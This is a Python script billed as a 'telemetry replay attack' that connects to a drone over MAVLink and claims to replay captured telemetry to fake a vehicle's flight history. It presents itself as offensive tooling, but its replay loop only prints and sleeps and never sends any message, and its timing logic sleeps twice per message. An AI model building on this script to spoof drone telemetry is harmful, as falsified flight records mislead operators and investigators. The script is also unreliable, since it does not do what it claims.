#!/usr/bin/env python3
"""
Telemetry Replay Attack Script
Replays captured telemetry data to create false flight history
"""

import sys
import json
import time
from pathlib import Path
from pymavlink import mavutil

def replay_telemetry(connection, telemetry_file, rate=10.0):
    """
    Replay captured telemetry data
    
    Args:
        connection: MAVLink connection object
        telemetry_file: Path to captured telemetry JSON file
        rate: Replay rate (messages per second)
    """
    telemetry_path = Path(telemetry_file)
    if not telemetry_path.exists():
        print(f"[-] Telemetry file not found: {telemetry_file}")
        return False
    
    print(f"[*] Loading telemetry from {telemetry_file}...")
    with open(telemetry_path, 'r') as f:
        telemetry_data = json.load(f)
    
    if not telemetry_data:
        print("[-] No telemetry data in file")
        return False
    
    print(f"[*] Replaying {len(telemetry_data)} telemetry messages...")
    print(f"[*] Replay rate: {rate} msg/s")
    
    target_system = connection.target_system
    target_component = connection.target_component
    
    interval = 1.0 / rate
    start_time = time.time()
    first_timestamp = telemetry_data[0].get('timestamp', start_time)
    
    try:
        for i, msg_data in enumerate(telemetry_data):
            msg_type = msg_data.get('type')
            data = msg_data.get('data', {})
            
            # Calculate relative time
            original_timestamp = msg_data.get('timestamp', first_timestamp)
            relative_time = original_timestamp - first_timestamp
            current_time = time.time() - start_time
            
            # Adjust timing to match replay rate
            if current_time < relative_time:
                time.sleep(relative_time - current_time)
            
            # Reconstruct and send message based on type
            # This is simplified - real implementation would reconstruct full MAVLink messages
            print(f"[*] Replaying {msg_type} message {i+1}/{len(telemetry_data)}")
            
            time.sleep(interval)
            
    except KeyboardInterrupt:
        print("\n[*] Stopping replay...")
    
    print("[+] Telemetry replay complete")
    return True

def main():
    if len(sys.argv) < 3:
        print("Usage: python3 telemetry_replay.py <connection> <telemetry_file> [rate]")
        print("Example: python3 telemetry_replay.py udp:127.0.0.1:14550 telemetry.json")
        print("Example: python3 telemetry_replay.py udp:127.0.0.1:14550 telemetry.json 20")
        sys.exit(1)
    
    connection_string = sys.argv[1]
    telemetry_file = sys.argv[2]
    rate = float(sys.argv[3]) if len(sys.argv) > 3 else 10.0
    
    print(f"[*] Connecting to {connection_string}...")
    try:
        connection = mavutil.mavlink_connection(connection_string)
        connection.wait_heartbeat(timeout=5)
        print("[+] Connected to vehicle")
    except Exception as e:
        print(f"[-] Failed to connect: {e}")
        sys.exit(1)
    
    # Replay telemetry
    success = replay_telemetry(connection, telemetry_file, rate)
    sys.exit(0 if success else 1)

if __name__ == "__main__":
    main()
